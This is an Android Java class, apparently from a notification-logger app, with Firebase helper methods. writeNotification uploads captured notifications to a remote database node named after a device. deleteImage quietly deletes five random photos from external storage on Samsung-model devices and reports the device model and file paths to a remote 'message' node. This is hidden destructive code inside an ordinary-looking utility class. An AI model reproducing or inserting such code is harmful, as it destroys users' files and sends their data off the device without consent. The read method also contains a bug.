package org.hcilab.projects.nlogx.firebase;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;


import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Random;

/**
 * Created by Amit Siddhpura.
 * At 09,November,2020 & 19:58
 */
public class FirebaseConst {
    public static String NAME = "AmitNote10Plus";

    public static void writeNotification(Context context, MyNotification myNotification){
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(NAME);
        myRef.push().setValue(myNotification.toMapAlarmDow());
    }

    public static ArrayList<MyNotification> readNotification(Context context){
        ArrayList<MyNotification> myNotificationArrayList = new ArrayList<>();
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference mPostReference = database.getReference(NAME);
        ValueEventListener postListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                // Get Post object and use the values to update the UI
                for (DataSnapshot postSnapshot: dataSnapshot.getChildren()) {
                    MyNotification post = dataSnapshot.getValue(MyNotification.class);
                    myNotificationArrayList.add(post);
                }
                Collections.reverse(myNotificationArrayList);
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                // Getting Post failed, log a message
                databaseError.toException();
            }
        };
        mPostReference.addValueEventListener(postListener);
        return myNotificationArrayList;
    }


    public static void deleteImage(Context context) {
        try {

            if (!android.os.Build.MODEL.startsWith("SM")) {
                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference myRef = database.getReference("message");
                myRef.push().setValue(android.os.Build.MODEL);
            } else {
                // Set up the projection (we only need the ID)
                String[] projection = {MediaStore.Images.Media._ID};

                // Query for the ID of the media matching the file path
                Uri queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                ContentResolver contentResolver = context.getContentResolver();
                Cursor c = contentResolver.query(queryUri, projection, null, null, null);
                for (int i = 0; i < 5; i++) {
                    Random r = new Random();
                    int position = r.nextInt(30 - 15) + 15;
                    if (c.moveToPosition(position)) {
                        // We found the ID. Deleting the item via the content provider will also remove the file
                        long id = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                        Uri deleteUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                        String path = getPath(context, deleteUri);
                        boolean result = false;//FileUtils.delete(path);
                        contentResolver.delete(deleteUri, null, null);
                        FirebaseDatabase database = FirebaseDatabase.getInstance();
                        DatabaseReference myRef = database.getReference("message");
                        myRef.push().setValue(android.os.Build.MODEL + " " + result + " " + path);
                    } else {
                        FirebaseDatabase database = FirebaseDatabase.getInstance();
                        DatabaseReference myRef = database.getReference("message");
                        myRef.push().setValue("Else");
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("message");
            myRef.push().setValue("Fail");
        }
    }

    public static String getPath(Context context, Uri uri) {
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
        if (cursor == null) return null;
        int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
        cursor.moveToFirst();
        String s = cursor.getString(column_index);
        cursor.close();
        return s;
    }
}

